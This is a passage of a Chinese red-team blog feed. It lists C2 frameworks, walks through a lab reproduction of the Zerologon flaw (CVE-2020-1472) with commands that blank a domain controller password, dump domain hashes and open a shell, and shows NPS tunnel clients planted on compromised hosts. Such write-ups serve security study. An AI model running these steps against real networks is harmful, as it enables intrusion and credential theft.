<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>夜莺</title>
  
  <subtitle>夜莺</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-02-11T07:54:55.463Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>夜莺</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>The Red Team Interview</title>
    <link href="http://example.com/2022/02/11/The-Red-Team-Interview/"/>
    <id>http://example.com/2022/02/11/The-Red-Team-Interview/</id>
    <published>2022-02-11T07:51:57.000Z</published>
    <updated>2022-02-11T07:54:55.463Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="4ad396799433e5b1b839b136329bf193940d756c0db642f98a35c9a13d2920d8"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="RedTeam" scheme="http://example.com/categories/RedTeam/"/>
    
    
    <category term="Redteam" scheme="http://example.com/tags/Redteam/"/>
    
  </entry>
  
  <entry>
    <title>开源的C2服务器</title>
    <link href="http://example.com/2021/12/21/%E5%BC%80%E6%BA%90%E7%9A%84C2%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>http://example.com/2021/12/21/%E5%BC%80%E6%BA%90%E7%9A%84C2%E6%9C%8D%E5%8A%A1%E5%99%A8/</id>
    <published>2021-12-21T07:09:00.000Z</published>
    <updated>2021-12-31T02:21:08.338Z</updated>
    
    <content type="html"><![CDATA[<h1 id="开源的C2服务器"><a href="#开源的C2服务器" class="headerlink" title="开源的C2服务器"></a>开源的C2服务器</h1><h1 id="1-Ares"><a href="#1-Ares" class="headerlink" title="1.Ares"></a>1.Ares</h1><p>Command add Control服务器，它是用于管理代理的Web界面。在受感染主机上运行的代理程序，可确保与CNC进行通信。</p><p>项目地址：<a href="https://github.com/sweetsoftware/Ares">https://github.com/sweetsoftware/Ares</a></p><p>支持语言：Python</p><h1 id="2-AsyncRAT-C"><a href="#2-AsyncRAT-C" class="headerlink" title="2.AsyncRAT-C#"></a>2.AsyncRAT-C#</h1><p>是一种远程访问工具（RAT），旨在通过安全的加密连接来远程监视和控制其他计算机。</p><p>项目地址：<a href="https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp">https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp</a></p><p>支持语言：C＃&amp; .Net</p><p>平台：Windows</p><h1 id="3-BabyShark"><a href="#3-BabyShark" class="headerlink" title="3.BabyShark"></a>3.BabyShark</h1><p>基于GTRS的思想，GTRS使用Google翻译作为代理来向受感染的主机发送命令。BabyShark项目旨在集中化与代理的反向连接，从而创建一种集中化多种类型连接的方式。</p><p>项目地址：<a href="https://github.com/UnkL4b/BabyShark">https://github.com/UnkL4b/BabyShark</a></p><p>支持语言：Python</p><h1 id="4-C3"><a href="#4-C3" class="headerlink" title="4.C3"></a>4.C3</h1><p>自定义命令和控制（C3）。一个用于快速定制C2通道原型的框架，同时仍提供与现有攻击性工具包的集成。</p><p>项目地址：<a href="https://github.com/FSecureLABS/C3">https://github.com/FSecureLABS/C3</a></p><p>支持语言：C++ </p><p>版本更新：v1.3.0</p><h1 id="5-CALDERA"><a href="#5-CALDERA" class="headerlink" title="5.CALDERA"></a>5.CALDERA</h1><p>一个网络安全框架，旨在轻松运行自主的违规和模拟练习。它也可用于运行手动红队参与或自动事件响应。它基于MITER ATT＆CK™框架构建，是MITRE的一项活跃的研究项目。</p><p>项目地址：<a href="https://github.com/mitre/caldera">https://github.com/mitre/caldera</a></p><p>支持语言：Python &amp; go</p><p>版本更新：2.9.0 支持web界面</p><p>系统支持：windows linux macOS</p><h1 id="6-Callidus"><a href="#6-Callidus" class="headerlink" title="6.Callidus"></a>6.Callidus</h1><p>它是使用C＃语言的.net核心框架开发的。允许操作员利用O365服务建立命令和控制通信通道。它使用Microsoft Graph API与O365服务进行通信。</p><p>项目地址：<a href="https://github.com/3xpl01tc0d3r/Callidus">https://github.com/3xpl01tc0d3r/Callidus</a></p><p>支持语言：C# &amp; .Net</p><p>系统支持：windows macOS</p><h1 id="7-CHAOS"><a href="#7-CHAOS" class="headerlink" title="7.CHAOS"></a>7.CHAOS</h1><p>CHAOS是一个远程管理工具，它允许生成二进制文件来控制远程操作系统。</p><p>项目地址：<a href="https://github.com/tiagorlampert/CHAOS">https://github.com/tiagorlampert/CHAOS</a></p><p>支持语言：go</p><p>系统支持：windows linux macOS</p><h1 id="8-Covenant"><a href="#8-Covenant" class="headerlink" title="8.Covenant"></a>8.Covenant</h1><p>Covenant是一个.NET命令和控制框架，旨在突出.NET的攻击面，使进攻性.NET商业工具的使用更加轻松，并充当红队成员的协作命令和控制平台。</p><p>项目地址：<a href="https://github.com/cobbr/Covenant">https://github.com/cobbr/Covenant</a></p><p>支持语言：C#</p><p>系统支持：windows</p><h1 id="9-Dali"><a href="#9-Dali" class="headerlink" title="9.Dali"></a>9.Dali</h1><p>Dali是基于映像的C2通道的服务器端一半，利用Imgur托管映像和任务代理。</p><p>项目地址：<a href="https://github.com/h0mbre/Dali">https://github.com/h0mbre/Dali</a></p><p>支持语言：python</p><h1 id="10-DeimosC2"><a href="#10-DeimosC2" class="headerlink" title="10.DeimosC2"></a>10.DeimosC2</h1><p>DeimosC2是开发后的命令与控制（C2）工具，它利用多种通信方法来控制受到威胁的计算机。</p><p>项目地址：<a href="https://github.com/DeimosC2/DeimosC2">https://github.com/DeimosC2/DeimosC2</a></p><p>支持语言：go</p><p>系统支持：windows linux</p><h1 id="11-Eggshell"><a href="#11-Eggshell" class="headerlink" title="11.Eggshell"></a>11.Eggshell</h1><p>EggShell是用Python编写的漏洞利用后监视工具。它为您提供了命令行会话，并在您和目标计算机之间提供了额外的功能。EggShell为您提供了上载/下载文件，制表符完成，拍照，位置跟踪，shell命令执行，持久性，权限提升，密码检索等等的强大功能和便利。这是项目的概念证明，旨在在您拥有的机器上使用。</p><p>项目地址：<a href="https://github.com/neoneggplant/EggShell">https://github.com/neoneggplant/EggShell</a></p><p>支持语言：python</p><h1 id="12-Empire"><a href="#12-Empire" class="headerlink" title="12.Empire"></a>12.Empire</h1><p>Empire 3是一个开发后框架，包括纯PowerShell Windows代理，并与Python 3.x Linux / OS X代理兼容。它是以前的PowerShell Empire和Python EmPyre项目的合并。该框架提供了密码安全的通信和灵活的体系结构。</p><p>项目地址：<a href="https://github.com/BC-SECURITY/Empire">https://github.com/BC-SECURITY/Empire</a></p><p>支持语言：Python</p><p>版本更新：v3.6.3</p><p>系统支持：windows linux macOS</p><h1 id="13-EvilOSX"><a href="#13-EvilOSX" class="headerlink" title="13.EvilOSX"></a>13.EvilOSX</h1><p>适用于macOS / OS X的邪恶RAT（远程管理工具）</p><p>项目地址：<a href="https://github.com/Marten4n6/EvilOSX">https://github.com/Marten4n6/EvilOSX</a></p><p>支持语言：Python</p><p>系统支持：windows linux macOS</p><h1 id="14-Faction-C2"><a href="#14-Faction-C2" class="headerlink" title="14.Faction C2"></a>14.Faction C2</h1><p>一个现代的，灵活的C2框架（当前为beta）</p><p>项目地址：<a href="https://github.com/FactionC2/">https://github.com/FactionC2/</a></p><p>支持语言：.net</p><p>系统支持：windows</p><h1 id="15-FlyingAFalseFlag"><a href="#15-FlyingAFalseFlag" class="headerlink" title="15.FlyingAFalseFlag"></a>15.FlyingAFalseFlag</h1><p>BlackHat USA 2019讨论命令和控制的幻灯片和概念代码</p><p>项目地址：<a href="https://github.com/monoxgas/FlyingAFalseFlag">https://github.com/monoxgas/FlyingAFalseFlag</a></p><p>支持语言：C++ &amp; python</p><p>系统支持：windows</p><h1 id="16-FudgeC2"><a href="#16-FudgeC2" class="headerlink" title="16.FudgeC2"></a>16.FudgeC2</h1><p>FudgeC2是一个Powershell C2平台，旨在促进团队协作和战役时间表，该平台在BlackHat Arsenal USA 2019上发布。旨在通过向客户提供更详细的对抗技术细节，帮助他们更好地理解红队活动。</p><p>项目地址：<a href="https://github.com/Ziconius/FudgeC2">https://github.com/Ziconius/FudgeC2</a></p><p>支持语言：python</p><p>系统支持：windows</p><h1 id="17-godoh"><a href="#17-godoh" class="headerlink" title="17.godoh"></a>17.godoh</h1><p>godoh是用Golang编写的概念验证命令和控制框架，该框架使用DNS-over-HTTPS作为传输介质。当前受支持的提供商包括Google，Cloudflare，但还包含使用传统DNS的功能。</p><p>项目地址：<a href="https://github.com/sensepost/goDoH">https://github.com/sensepost/goDoH</a></p><p>支持语言：go</p><p>系统支持：windows linux macOS</p><h1 id="18-GRAT2"><a href="#18-GRAT2" class="headerlink" title="18.GRAT2"></a>18.GRAT2</h1><p>GRAT2是用python3编写的命令和控制（C2）工具，而.NET 4.5是客户端。主要想法来自发起该项目的Georgios Koumettou。</p><p>项目地址：<a href="https://github.com/r3nhat/GRAT2">https://github.com/r3nhat/GRAT2</a></p><p>支持语言：C# &amp; python</p><h1 id="19-HARS"><a href="#19-HARS" class="headerlink" title="19.HARS"></a>19.HARS</h1><p>项目地址：<a href="https://github.com/onSec-fr/Http-Asynchronous-Reverse-Shell">https://github.com/onSec-fr/Http-Asynchronous-Reverse-Shell</a></p><p>支持语言：C# &amp; python</p><p>系统支持：windows</p><h1 id="20-HTTP-RevShell"><a href="#20-HTTP-RevShell" class="headerlink" title="20.HTTP-RevShell"></a>20.HTTP-RevShell</h1><p>HTTP-revshell是一个针对redteam练习和渗透测试者的工具。该工具通过http / s协议提供反向连接。它使用隐蔽渠道通过Web请求来控制受害机器，从而逃避了IDS，IPS和AV等解决方案。</p><p>项目地址：<a href="https://github.com/3v4Si0N/HTTP-revshell">https://github.com/3v4Si0N/HTTP-revshell</a></p><p>支持语言：python</p><h1 id="21-ibombshell"><a href="#21-ibombshell" class="headerlink" title="21.ibombshell"></a>21.ibombshell</h1><p>ibombshell是用Powershell编写的工具，它使您可以随时使用开发后的功能（在某些情况下是开发中）发出提示。它是一个直接下载到内存中的外壳，可以访问大量的渗透测试功能。这些功能可以Powershell功能的形式直接下载到内存中。</p><p>项目地址：<a href="https://github.com/Telefonica/ibombshell">https://github.com/Telefonica/ibombshell</a></p><p>支持语言：python</p><p>系统支持：windows linux macOS</p><h1 id="22-INNUENDO"><a href="#22-INNUENDO" class="headerlink" title="22.INNUENDO"></a>22.INNUENDO</h1><p>项目地址：<a href="https://www.immunityinc.com/products/innuendo/">https://www.immunityinc.com/products/innuendo/</a></p><p>支持语言：python</p><p>系统支持：windows linux macOS</p><h1 id="23-Koadic-C3"><a href="#23-Koadic-C3" class="headerlink" title="23.Koadic C3"></a>23.Koadic C3</h1><p>从阶段0到更高阶段，可以完全在内存中提供有效载荷，也可以使用基于SSL和TLS的加密安全通信（取决于受害OS启用的功能）。</p><p>项目地址：<a href="https://github.com/zerosum0x0/koadic">https://github.com/zerosum0x0/koadic</a></p><p>支持语言：python</p><p>系统支持：windows</p><h1 id="24-MacShellSwift"><a href="#24-MacShellSwift" class="headerlink" title="24.MacShellSwift"></a>24.MacShellSwift</h1><p>用Swift编写的概念证明MacOS后期开发工具。设计为POC，供蓝色团队构建macOS检测。</p><p>项目地址：<a href="https://github.com/cedowens/MacShellSwift">https://github.com/cedowens/MacShellSwift</a></p><p>支持语言：python</p><p>系统支持：macOS</p><h1 id="25-Merlin"><a href="#25-Merlin" class="headerlink" title="25.Merlin"></a>25.Merlin</h1><p>Merlin是使用golang编写的跨平台的利用后HTTP / 2命令和控制服务器和代理。</p><p>项目地址：<a href="https://github.com/Ne0nd0g/merlin">https://github.com/Ne0nd0g/merlin</a></p><p>支持语言：go</p><p>系统支持：windows linux macOS</p><h1 id="26-Meterpeter"><a href="#26-Meterpeter" class="headerlink" title="26.Meterpeter"></a>26.Meterpeter</h1><p>具有内置命令的C2 Powershell命令和控制框架（模块）</p><p>项目地址：<a href="https://github.com/r00t-3xp10it/meterpeter">https://github.com/r00t-3xp10it/meterpeter</a></p><p>支持语言：go</p><p>版本更新：v2.10.3开发版</p><p>系统支持：windows linux macOS</p><h1 id="27、WinRM"><a href="#27、WinRM" class="headerlink" title="27、WinRM"></a>27、WinRM</h1><p>项目地址：<a href="https://github.com/Hackplayers/evil-winrm">链接</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;开源的C2服务器&quot;&gt;&lt;a href=&quot;#开源的C2服务器&quot; class=&quot;headerlink&quot; title=&quot;开源的C2服务器&quot;&gt;&lt;/a&gt;开源的C2服务器&lt;/h1&gt;&lt;h1 id=&quot;1-Ares&quot;&gt;&lt;a href=&quot;#1-Ares&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="RedTeam" scheme="http://example.com/categories/RedTeam/"/>
    
    
    <category term="Tool" scheme="http://example.com/tags/Tool/"/>
    
  </entry>
  
  <entry>
    <title>Slack自动化完成子域名监控</title>
    <link href="http://example.com/2020/10/27/Slack%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%8C%E6%88%90%E5%AD%90%E5%9F%9F%E5%90%8D%E7%9B%91%E6%8E%A7/"/>
    <id>http://example.com/2020/10/27/Slack%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%8C%E6%88%90%E5%AD%90%E5%9F%9F%E5%90%8D%E7%9B%91%E6%8E%A7/</id>
    <published>2020-10-27T07:05:13.000Z</published>
    <updated>2021-09-28T09:36:03.278Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Slack自动化完成子域名监控"><a href="#Slack自动化完成子域名监控" class="headerlink" title="Slack自动化完成子域名监控"></a>Slack自动化完成子域名监控</h1><p>[toc]</p><h2 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h2><ul><li>ubuntu 18.04</li><li>python3</li><li>免费的Slack空间</li></ul><h2 id="0x02-Sublert搭建"><a href="#0x02-Sublert搭建" class="headerlink" title="0x02 Sublert搭建"></a>0x02 Sublert搭建</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/yassineaboukir/sublert.git</span><br><span class="line">cd sublert</span><br><span class="line">pip3 install -r requirements.txt</span><br></pre></td></tr></table></figure><h2 id="0x03-Slack与工具配置"><a href="#0x03-Slack与工具配置" class="headerlink" title="0x03 Slack与工具配置"></a>0x03 Slack与工具配置</h2><ol><li><p>在官网<a href="https://slack.com/%E6%B3%A8%E5%86%8C%E5%85%8D%E8%B4%B9%E8%B4%A6%E6%88%B7%EF%BC%8C%E5%B9%B6%E5%88%9B%E5%BB%BA%E4%B8%A4%E4%B8%AAchannel%EF%BC%8C%E5%A6%82%E4%B8%8B%E6%89%80%E7%A4%BA%EF%BC%8C%E7%94%A8%E4%BA%8E%E5%90%8E%E6%9C%9F%E7%9A%84%E5%AD%90%E5%9F%9F%E5%90%8D%E7%9B%91%E6%8E%A7%E5%92%8C%E9%94%99%E8%AF%AF%E4%BF%A1%E6%81%AF%E6%B1%87%E6%80%BB">https://slack.com/注册免费账户，并创建两个channel，如下所示，用于后期的子域名监控和错误信息汇总</a><br><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/Py7kRq.png" alt="Py7kRq"></p></li><li><p>为第一步创建的Channel配置对应的webhook url<br>在以下地址配置APP<br><a href="https://api.slack.com/apps">https://api.slack.com/apps</a><br><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/XRhPEY.png" alt="XRhPEY"></p></li><li><p>点击Incoming Webhooks,创建两个Webhook<br><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/ISapdl.png" alt="ISapdl"><br>指向之前创建的Channel<br><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/CI5vL4.png" alt="CI5vL4"></p></li><li><p>复制第三步得到的Webhook URl。并配置到<code>config.py</code>中</p></li></ol><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/URX2eZ.png" alt="URX2eZ"></p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/x75EXi.png" alt="x75EXi"></p><ol start="5"><li>配置Crontab</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x</span><br><span class="line">crontab -e</span><br><span class="line">0 */12 * * * cd /root/sublert/ &amp;&amp; /usr/bin/python3 /root/sublert/sublert.py -r -l &gt;&gt; /var/log/sublert.log 2&gt;&amp;1</span><br></pre></td></tr></table></figure><h2 id="0x04-结语"><a href="#0x04-结语" class="headerlink" title="0x04 结语"></a>0x04 结语</h2><p>大佬们可修改脚本，使之支持企业微信或者钉钉的Webhook</p><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><ul><li><a href="https://github.com/yassineaboukir/sublert">https://github.com/yassineaboukir/sublert</a></li><li><a href="https://medium.com/@yassineaboukir/automated-monitoring-of-subdomains-for-fun-and-profit-release-of-sublert-634cfc5d7708">https://medium.com/@yassineaboukir/automated-monitoring-of-subdomains-for-fun-and-profit-release-of-sublert-634cfc5d7708</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Slack自动化完成子域名监控&quot;&gt;&lt;a href=&quot;#Slack自动化完成子域名监控&quot; class=&quot;headerlink&quot; title=&quot;Slack自动化完成子域名监控&quot;&gt;&lt;/a&gt;Slack自动化完成子域名监控&lt;/h1&gt;&lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;</summary>
      
    
    
    
    <category term="神兵利器" scheme="http://example.com/categories/%E7%A5%9E%E5%85%B5%E5%88%A9%E5%99%A8/"/>
    
    
    <category term="SRC" scheme="http://example.com/tags/SRC/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-1472漏洞复现</title>
    <link href="http://example.com/2020/09/21/CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2020/09/21/CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-09-21T11:41:29.000Z</published>
    <updated>2021-10-09T09:54:58.452Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2020-1472漏洞复现"><a href="#CVE-2020-1472漏洞复现" class="headerlink" title="CVE-2020-1472漏洞复现"></a>CVE-2020-1472漏洞复现</h1><h2 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01 漏洞简介"></a>0x01 漏洞简介</h2><blockquote><p>2020年08月12日，Windows官方 发布了 <code>NetLogon 特权提升漏洞</code> 的风险通告，该漏洞编号为 <code>CVE-2020-1472</code></p><p>漏洞等级：<code>严重</code></p><p>漏洞评分：<code>10分</code></p><p>攻击者通过NetLogon（MS-NRPC），建立与域控间易受攻击的安全通道时，可利用此漏洞获取域管访问权限。成功利用此漏洞的攻击者可以在该网络中的设备上运行经特殊设计的应用程序</p></blockquote><h2 id="0x02-漏洞影响"><a href="#0x02-漏洞影响" class="headerlink" title="0x02 漏洞影响"></a>0x02 漏洞影响</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Windows Server <span class="number">2008</span> R2 <span class="keyword">for</span> x64-based Systems Service Pack <span class="number">1</span></span><br><span class="line">Windows Server <span class="number">2008</span> R2 <span class="keyword">for</span> x64-based Systems Service Pack <span class="number">1</span> (Server Core installation)</span><br><span class="line">Windows Server <span class="number">2012</span></span><br><span class="line">Windows Server <span class="number">2012</span> (Server Core installation)</span><br><span class="line">Windows Server <span class="number">2012</span> R2</span><br><span class="line">Windows Server <span class="number">2012</span> R2 (Server Core installation)</span><br><span class="line">Windows Server <span class="number">2016</span></span><br><span class="line">Windows Server <span class="number">2016</span> (Server Core installation)</span><br><span class="line">Windows Server <span class="number">2019</span></span><br><span class="line">Windows Server <span class="number">2019</span> (Server Core installation)</span><br><span class="line">Windows Server, version <span class="number">1903</span> (Server Core installation)</span><br><span class="line">Windows Server, version <span class="number">1909</span> (Server Core installation)</span><br><span class="line">Windows Server, version <span class="number">2004</span> (Server Core installation)</span><br></pre></td></tr></table></figure><h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p><strong>漏洞环境</strong></p><p>靶机：Windows Server 2012</p><p>攻击机：Kali</p><p><strong>复现步骤</strong></p><ol><li><p>拉取POC</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/dirkjanm/CVE-2020-1472.git</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200921155539106.png" alt="image-20200921155539106"></p></li><li><p>使用POC重置管理员密钥</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 cve-<span class="number">2020</span>-<span class="number">1472</span>-exploit.py  hostname ip</span><br></pre></td></tr></table></figure></li></ol><blockquote><p>坑：攻击机环境要求python版本再3.7以上，而且要获取最新版的Impacket，否则会产生如下报错报错（新版本中更新了我们利用中会用到的函数NetrServerPasswordSet2）</p></blockquote><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200921180251867.png" alt="image-20200921180251867"></p><p><strong>安装Impacket</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/SecureAuthCorp/impacket</span><br><span class="line">cd impacket</span><br><span class="line">pip install .</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200921185101122.png" alt="image-20200921185101122"></p><p>此时密码已经置空</p><ol start="3"><li>获取HASH</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~impacket/examples/</span><br><span class="line"></span><br><span class="line"># windows</span><br><span class="line">python secretsdump.py DOMAIN/DC_NETBIOS_NAME$@DC_IP_ADDR -just-dc -no-pass  # Windows无需转义</span><br><span class="line"># others</span><br><span class="line">python secretsdump.py DOMAIN/DC_NETBIOS_NAME\$@DC_IP_ADDR -just-dc -no-pass  #注意转义</span><br></pre></td></tr></table></figure><p>成功获取HASH</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200921190154484.png" alt="image-20200921190154484"></p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200921190454938.png" alt="image-20200921190454938"></p><ol start="4"><li>获取Shell</li></ol><p>根据第三步获取到的HASH，利用wmiexec.py登录，从而获取一个SHELL</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">~impacket/examples/</span><br><span class="line"></span><br><span class="line">python wmiexec.py -hashes &lt;HASH&gt; DOMAIN/DOMAIN_USER@DC_IP_ADDR</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200921192241359.png" alt="image-20200921192241359"></p><h2 id="0x04-修复建议"><a href="#0x04-修复建议" class="headerlink" title="0x04 修复建议"></a>0x04 修复建议</h2><p>安装符合操作系统的漏洞补丁，</p><p>详情请见：</p><p><a href="https://portal.msrc.microsoft.com/zh-cn/security-guidance/advisory/CVE-2020-1472">https://portal.msrc.microsoft.com/zh-cn/security-guidance/advisory/CVE-2020-1472</a></p><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><ul><li>Impacket:<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></li><li>重置管理员密码POC：<a href="https://github.com/dirkjanm/CVE-2020-1472">https://github.com/dirkjanm/CVE-2020-1472</a></li><li>恢复密码POC：<a href="https://github.com/risksense/zerologon">https://github.com/risksense/zerologon</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CVE-2020-1472漏洞复现&quot;&gt;&lt;a href=&quot;#CVE-2020-1472漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;CVE-2020-1472漏洞复现&quot;&gt;&lt;/a&gt;CVE-2020-1472漏洞复现&lt;/h1&gt;&lt;h2 id=&quot;0x01-</summary>
      
    
    
    
    <category term="漏洞复现" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>NPS快速实战</title>
    <link href="http://example.com/2020/09/13/NPS%E5%BF%AB%E9%80%9F%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    <id>http://example.com/2020/09/13/NPS%E5%BF%AB%E9%80%9F%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</id>
    <published>2020-09-13T06:49:22.000Z</published>
    <updated>2021-09-28T09:34:50.344Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NPS快速使用技巧"><a href="#NPS快速使用技巧" class="headerlink" title="NPS快速使用技巧"></a>NPS快速使用技巧</h1><h2 id="0x01-NPS搭建"><a href="#0x01-NPS搭建" class="headerlink" title="0x01 NPS搭建"></a>0x01 NPS搭建</h2><ol><li>从github下载安装包</li></ol><p><a href="https://github.com/ehang-io/nps/releases/">Releases · ehang-io/nps</a></p><ul><li>注：服务端和客户端是单独分开的，同时注意系统架构版本</li></ul><ol start="2"><li>构建</li></ol><p>下载完服务器压缩包后，解压，然后进入解压后的文件夹</p><ul><li>执行安装命令</li></ul><p>对于linux | darwin <code>sudo ./nps install</code></p><p>对于Windows，管理员身份运行cmd，进入安装目录 <code>nps.exe install</code></p><ul><li>启动</li></ul><p>对于linux | darwin <code>sudo nps start</code></p><p>对于Windows，管理员身份运行cmd，进入程序目录 <code>nps.exe start</code></p><p><code>安装后windows配置文件位于 C:\Program Files\nps，linux和darwin位于/etc/nps</code></p><p>停止和重启可用，stop和restart</p><ul><li><p>Windows日志文件位于当前运行目录下，linux和darwin位于/var/log/nps.log</p></li><li><p>访问服务端ip：web服务端口（默认为8080）</p></li><li><p>使用用户名和密码登陆（默认管理员/ 123，正式使用一定要更改）</p></li><li><p>创建客户端</p></li></ul><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200913143322688.png" alt="image-20200913143322688"></p><h2 id="0x02-NPS快速实战"><a href="#0x02-NPS快速实战" class="headerlink" title="0x02 NPS快速实战"></a>0x02 NPS快速实战</h2><ol><li>针对已获取目标机器权限，根据不同系统架构在github上选择对应版本下载，之后在控制台页面新增客户端</li></ol><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/Untitled%201.png" alt="NPS%E5%BF%AB%E9%80%9F%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%2095da338c5f494aa4b285abf505283193/Untitled%201.png"></p><ul><li>可根据需求选择自定义生成密钥，默认会自动随机生成密钥，至于Basic401认证仅限于socks5、web、http等特殊隧道选择。</li></ul><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/Untitled%202.png" alt="NPS%E5%BF%AB%E9%80%9F%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%2095da338c5f494aa4b285abf505283193/Untitled%202.png"></p><p>新增成功后，点击前面的+号可快速生成客户端安装命令，常规命令格式：</p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">./npc -server=NPS_IP:NPS_PORT -vkey=vkey -type=tcp(udp)</span><br></pre></td></tr></table></figure><p>根据目标系统，选择不同安装方式,命令格式如上，对于注册到系统服务的使用以下命令：</p><p>WIndows:</p><ul><li><p>需要管理员运行CMD</p></li><li><p>注册：<code>npc.exe install 其他参数（例如-server=xx -vkey=xx或者-config=xxx）</code></p></li><li><p>启动：<code>npc.exe start</code></p></li><li><p>停止：<code>npc.exe stop</code></p></li><li><p>如果需要更换命令内容需要先卸载<code>npc.exe uninstall</code></p><p>，再重新注册</p></li><li><p>如果需要当客户端退出时自动重启客户端，请按照如下所示配置</p></li></ul><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/Untitled%203.png" alt="NPS%E5%BF%AB%E9%80%9F%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%2095da338c5f494aa4b285abf505283193/Untitled%203.png"></p><p>Liunx:</p><ul><li>注册：<code>sudo ./npc install 其他参数（例如-server=xx -vkey=xx或者-config=xxx）</code></li><li>启动：<code>sudo npc start</code></li><li>停止：<code>sudo npc stop</code></li><li>如果需要更换命令内容需要先卸载<code>./npc uninstall</code>，再重新注册</li><li>inux和darwin日志位于/var/log/npc.log</li></ul><p>以上操作无误的话，web控制台应该客户端状态应该显示在线了，这里测试，故为离线，之后的使用方法就简单了</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/Untitled%204.png" alt="NPS%E5%BF%AB%E9%80%9F%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%2095da338c5f494aa4b285abf505283193/Untitled%204.png"></p><p>点击客户端右边的隧道-新增隧道</p><p><img 